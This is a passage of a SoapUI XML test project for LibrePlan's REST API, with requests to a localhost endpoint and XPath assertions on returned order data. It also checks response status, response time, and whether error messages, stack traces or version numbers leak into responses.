//ns1:order-list[1]/ns1:order[2]/@init-date</con:path><con:element>@init-date</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>2022-11-09</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[2]/@name</con:path><con:element>@name</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>Test</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[2]/@code</con:path><con:element>@code</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>ORDER0004</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[2]/ns1:labels[1]</con:path><con:element>labels</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[2]/ns1:material-assignments[1]</con:path><con:element>material-assignments</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[2]/ns1:advance-measurements[1]</con:path><con:element>advance-measurements</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[2]/ns1:criterion-requirements[1]</con:path><con:element>criterion-requirements</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[2]/ns1:children[1]</con:path><con:element>children</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:originalMessage><![CDATA[<?xml version="1.0" encoding="UTF-8" standalone="yes"?><order-list xmlns="http://rest.ws.libreplan.org"><order calendar-name="Default" dependencies-constraints-have-priority="false" deadline="2022-12-20" init-date="2022-12-05" name="PROJET_TEST1" code="ORDER0002"><labels/><material-assignments/><advance-measurements/><criterion-requirements/><children><order-line deadline="2022-12-15" init-date="2022-12-05" name="Tache1-P1" code="ORDER0002-0003"><labels/><material-assignments/><advance-measurements/><criterion-requirements/><hours-groups><hours-group working-hours="5" resource-type="WORKER" code="ORDER0002-0003-0001"><criterion-requirements/></hours-group></hours-groups></order-line><order-line deadline="2022-12-20" init-date="2022-12-08" name="Tache2-P1" code="ORDER0002-0001"><labels/><material-assignments/><advance-measurements/><criterion-requirements/><hours-groups><hours-group working-hours="10" resource-type="WORKER" code="ORDER0002-0001-0001"><criterion-requirements/></hours-group></hours-groups></order-line><order-line deadline="2022-12-12" init-date="2022-12-05" name="Tache3-P1" code="ORDER0002-0002"><labels/><material-assignments/><advance-measurements/><criterion-requirements/><hours-groups><hours-group working-hours="20" resource-type="WORKER" code="ORDER0002-0002-0001"><criterion-requirements/></hours-group></hours-groups></order-line><order-line deadline="2022-12-20" init-date="2022-12-13" name="Tache4-P1" code="ORDER0002-0004"><labels/><material-assignments/><advance-measurements/><criterion-requirements/><hours-groups><hours-group working-hours="8" resource-type="WORKER" code="ORDER0002-0004-0001"><criterion-requirements/></hours-group></hours-groups></order-line></children></order><order calendar-name="Default" dependencies-constraints-have-priority="false" deadline="2022-11-10" init-date="2022-11-09" name="Test" code="ORDER0004"><labels/><material-assignments/><advance-measurements/><criterion-requirements/><children/></order></order-list>]]></con:originalMessage></con:configuration></con:assertion><con:credentials><con:username>wsreader</con:username><con:password>wsreader</con:password><con:selectedAuthProfile>Writer</con:selectedAuthProfile><con:preemptive>true</con:preemptive><con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:parameters><con:entry key="service-path" value="${Properties#service-path}"/></con:parameters><con:parameterOrder><con:entry>service-path</con:entry></con:parameterOrder><con:environmentSpec><con:entry environmentId="5eadaddc-50e1-41ae-911a-8a2f7c39ffe0"><con:authProfile>No Authorization</con:authProfile></con:entry><con:entry environmentId="e2e9701f-ac19-4e25-a4a0-65eddefe8bd7"><con:authProfile>Reader</con:authProfile></con:entry><con:entry environmentId="d0beedb0-1186-4d88-99b9-78d2322fa1f9"><con:authProfile>Writer</con:authProfile></con:entry></con:environmentSpec></con:restRequest></con:config></con:testStep><con:testStep id="9ac3e940-a5e4-4ab7-a53c-8442d67c6b5d" name="PropertyTransfer 1" type="transfer"><con:settings/><con:config xsi:type="con:PropertyTransfersStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:transfers entitize="false" failOnError="true" ignoreEmpty="false" setNullOnMissingSource="true" transferChildNodes="false" transferTextContent="true" transferToAll="false"><con:name>@code</con:name><con:sourceType>ResponseAsXml</con:sourceType><con:sourceStep>REST Request -  Récupérer tous les projets pour trouver Code du premier projet</con:sourceStep><con:sourcePath>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/@code</con:sourcePath><con:targetType>entity-code</con:targetType><con:targetStep>REST Request - Récupérer le projet correspondant au code du premier projet</con:targetStep><con:targetPath/><con:upgraded>true</con:upgraded></con:transfers></con:config></con:testStep><con:testStep id="5d501661-1a0b-4f83-8a27-7419ec90745d" name="REST Request - Récupérer le projet correspondant au code du premier projet" type="restrequest"><con:settings/><con:config xsi:type="con:RestRequestStep" methodName="GET - Export one" resourcePath="/ws/rest/{service-path}/{entity-code}/" service="LibrePlan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:restRequest id="11439256-6ea8-452a-a606-e59e2dd3bfa1" mediaType="application/json" name="REST Request - Récupérer le projet correspondant au code du premier projet"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:endpoint>http://localhost:8180/libreplan/</con:endpoint><con:request/><con:originalUri>http://localhost/libreplan/common/layout/login.zul;jsessionid=0CB464E1E9C5470F7D36CF3F2918BBB3</con:originalUri><con:assertion id="cabf2277-cc8b-4632-85fa-5872006370f6" name="Valid HTTP Status Codes" type="Valid HTTP Status Codes"><con:settings/><con:configuration><codes>200</codes></con:configuration></con:assertion><con:assertion name="Response SLA" type="Response SLA Assertion" id="ae4ffbd9-49e8-4b87-a383-337dcde9cd29"><con:configuration><SLA>1000</SLA></con:configuration></con:assertion><con:assertion type="Sensitive Information Exposure" name="Sensitive Information Exposure" id="3adfe18a-aed2-4e02-a552-05fbf35cbeb1"><con:configuration><AssertionSpecificExposureList>~(?s).*Runtime (E|e)rror.*###[Stacktrace] Can give hackers information about which software or language you are using</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*SQLSTATE: [A-Z0-9].*###[Database error messages] Internal database information can be misused by hackers</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*(s|S)tack:.*###[Stacktrace] Can give hackers information about which software or language you are using</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*(s|S)yntax (e|E)rror\s.*###[Stacktrace] Can give hackers information about which software or language you are using</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*\w+/\d{1,2}(\.\d{1,3})+.*###[Version x.y.z] Exposing version numbers gives
            unnecessary hints on your systems vulnerabilities</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*Invalid column name\s.*###[Database error messages] Internal database information can be misused by hackers</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*
            (ORA|EXP|IMP|KUP|UDE|UDI|DBV|LCD|QSM|OCI|RMAN|LFI|PLS|PLQ|AMD|CLSR|PROC|PROT|TNS|NNC|NLP|NNF|NMP|NCR|NZE|O2F|O2I|O2U|PCB|PCC|SQL|AUD|IMG|VID|DRG|LPX|LSX)-\d{5}\s
        .*###[Database error messages] Internal database information can be misused by hackers</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*(p|P)owered by:? ([a-zA-Z]+)( [a-zA-Z]+){0,3}( |/)\d\.\d{1,2}\.\d{1,3}.*###[Version x.y.z] Exposing version numbers gives
            unnecessary hints on your systems vulnerabilities</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*at [\w\$]+(\.[\w\$&lt;>\[\],]+|\.\.ctor)+(\((([\w\$&lt;>\`\[\]]+ [\w\$&lt;>]+, )*(([\w\$&lt;>\`\[\]]+
            [\w\$&lt;>]+)))\)|\(\))
        .*###[Stacktrace] Can give hackers information about which software or language you are using</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*&lt;\w+:frame\s*class=".*"\s*line=".*"\s*method=".*"\s*/>.*###[Stacktrace] Can give hackers information about which software or language you are using</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*Traceback \(most recent call last\):.*###[Stacktrace] Can give hackers information about which software or language you are using</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*((I|i)ncorrect|(I|i)nvalid) (s|S)yntax.*###[Stacktrace] Can give hackers information about which software or language you are using</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*(s|S)tack ?(t|T)race.*###[Stacktrace] Can give hackers information about which software or language you are using</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*(e|E)rror was:\s.*###[Database error messages] Internal database information can be misused by hackers</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*(v|V)ersion:? \d\.\d{1,2}\.{1,3}-?.*###[Version x.y.z] Exposing version numbers gives
            unnecessary hints on your systems vulnerabilities</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*from [\w\$]+(\.[\w\$&lt;>]+)+:\d+:in `.+'.*###[Stacktrace] Can give hackers information about which software or language you are using</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*Error in process &lt;\d+\.\d+\.\d+> with exit value:.*###[Stacktrace] Can give hackers information about which software or language you are using</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*STACK\s?TRACE.*###[Stacktrace] Can give hackers information about which software or language you are using</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*Warning: [\w]+\(\) .+ in .+ on line \d{1,6}.*###[Stacktrace] Can give hackers information about which software or language you are using</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*((A|a)pache|vBulletin|MySQL|PostgreSQL|phpBB|Internet Information Services)( |/)\d{1,2}(\.\d{1,3})+
        .*###[Version x.y.z] Exposing version numbers gives
            unnecessary hints on your systems vulnerabilities</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*at [a-zA-Z][\w\$]*(\.[a-zA-Z][\w\$]*)+\((Unknown Source|Native
            Method|[a-zA-Z][\w\$]*\.([a-zA-Z]{3,5}):\d+)\)
        .*###[Stacktrace] Can give hackers information about which software or language you are using</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*[^\s]+\.rb:\d+:in `.+'.*###[Stacktrace] Can give hackers information about which software or language you are using</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*File ".+", line [0-9]{1,6}, in.*###[Stacktrace] Can give hackers information about which software or language you are using</AssertionSpecificExposureList><IncludeProjectSpecific>true</IncludeProjectSpecific><IncludeGlobal>false</IncludeGlobal></con:configuration></con:assertion><con:assertion type="Simple NotContains" name="Not Contains" id="9b68625b-7e9f-4a03-b8f3-dd5a495b6628"><con:configuration><token>Sorry, JavaScript must be enabled.&lt;br/>Change your browser options, then &lt;a href="">try again&lt;/a>.</token><ignoreCase>false</ignoreCase><useRegEx>false</useRegEx></con:configuration></con:assertion><con:assertion type="DataAndMetadataAssertion" id="6f1e7414-0216-45c3-b4f6-1e492788bafd" name="Smart Assertion"><con:configuration xsi:type="con:DataAndMetadataAssertion"><con:mode>Received Data</con:mode><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/@calendar-name</con:path><con:element>@calendar-name</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>Default</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/@dependencies-constraints-have-priority</con:path><con:element>@dependencies-constraints-have-priority</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>false</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/@deadline</con:path><con:element>@deadline</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>2022-12-20</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/@init-date</con:path><con:element>@init-date</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>2022-12-05</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/@name</con:path><con:element>@name</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>PROJET_TEST1</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/@code</con:path><con:element>@code</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>ORDER0002</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:labels[1]</con:path><con:element>labels</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:material-assignments[1]</con:path><con:element>material-assignments</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:advance-measurements[1]</con:path><con:element>advance-measurements</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:criterion-requirements[1]</con:path><con:element>criterion-requirements</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[1]/@deadline</con:path><con:element>@deadline</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>2022-12-15</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[1]/@init-date</con:path><con:element>@init-date</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>2022-12-05</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[1]/@name</con:path><con:element>@name</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>Tache1-P1</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[1]/@code</con:path><con:element>@code</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>ORDER0002-0003</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[1]/ns1:labels[1]</con:path><con:element>labels</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[1]/ns1:material-assignments[1]</con:path><con:element>material-assignments</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[1]/ns1:advance-measurements[1]</con:path><con:element>advance-measurements</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[1]/ns1:criterion-requirements[1]</con:path><con:element>criterion-requirements</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[1]/ns1:hours-groups[1]/ns1:hours-group[1]/@working-hours</con:path><con:element>@working-hours</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>5</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[1]/ns1:hours-groups[1]/ns1:hours-group[1]/@resource-type</con:path><con:element>@resource-type</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>WORKER</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[1]/ns1:hours-groups[1]/ns1:hours-group[1]/@code</con:path><con:element>@code</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>ORDER0002-0003-0001</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[1]/ns1:hours-groups[1]/ns1:hours-group[1]/ns1:criterion-requirements[1]</con:path><con:element>criterion-requirements</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[2]/@deadline</con:path><con:element>@deadline</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>2022-12-20</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[2]/@init-date</con:path><con:element>@init-date</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>2022-12-08</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[2]/@name</con:path><con:element>@name</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>Tache2-P1</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[2]/@code</con:path><con:element>@code</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>ORDER0002-0001</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[2]/ns1:labels[1]</con:path><con:element>labels</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[2]/ns1:material-assignments[1]</con:path><con:element>material-assignments</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[2]/ns1:advance-measurements[1]</con:path><con:element>advance-measurements</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[2]/ns1:criterion-requirements[1]</con:path><con:element>criterion-requirements</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[2]/ns1:hours-groups[1]/ns1:hours-group[1]/@working-hours</con:path><con:element>@working-hours</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>10</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[2]/ns1:hours-groups[1]/ns1:hours-group[1]/@resource-type</con:path><con:element>@resource-type</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>WORKER</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[2]/ns1:hours-groups[1]/ns1:hours-group[1]/@code</con:path><con:element>@code</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>ORDER0002-0001-0001</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[2]/ns1:hours-groups[1]/ns1:hours-group[1]/ns1:criterion-requirements[1]</con:path><con:element>criterion-requirements</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[3]/@deadline</con:path><con:element>@deadline</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>2022-12-12</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[3]/@init-date</con:path><con:element>@init-date</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>2022-12-05</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[3]/@name</con:path><con:element>@name</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>Tache3-P1</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[3]/@code</con:path><con:element>@code</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>ORDER0002-0002</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[3]/ns1:labels[1]</con:path><con:element>labels</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[3]/ns1:material-assignments[1]</con:path><con:element>material-assignments</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[3]/ns1:advance-measurements[1]</con:path><con:element>advance-measurements</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[3]/ns1:criterion-requirements[1]</con:path><con:element>criterion-requirements</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[3]/ns1:hours-groups[1]/ns1:hours-group[1]/@working-hours</con:path><con:element>@working-hours</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>20</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[3]/ns1:hours-groups[1]/ns1:hours-group[1]/@resource-type</con:path><con:element>@resource-type</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>WORKER</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[3]/ns1:hours-groups[1]/ns1:hours-group[1]/@code</con:path><con:element>@code</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>ORDER0002-0002-0001</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[3]/ns1:hours-groups[1]/ns1:hours-group[1]/ns1:criterion-requirements[1]</con:path><con:element>criterion-requirements</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[4]/@deadline</con:path><con:element>@deadline</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>2022-12-20</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[4]/@init-date</con:path><con:element>@init-date</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>2022-12-13</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[4]/@name</con:path><con:element>@name</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>Tache4-P1</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[4]/@code</con:path><con:element>@code</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>ORDER0002-0004</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
